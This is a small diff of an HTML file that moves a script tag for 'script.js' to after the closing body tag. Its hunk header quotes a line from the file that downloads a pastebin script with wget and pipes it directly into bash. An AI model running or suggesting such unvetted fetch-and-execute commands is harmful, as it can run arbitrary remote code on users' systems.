@@ -95,6 +95,6 @@ wget -O - https://pastebin.com/raw/VQ0NtSUa | sed "s/\r$//" | bash
 					</header>
 				</div>
 			</div>
-<script src="script.js">
 	</body>
+	<script src="script.js" />
 </html>
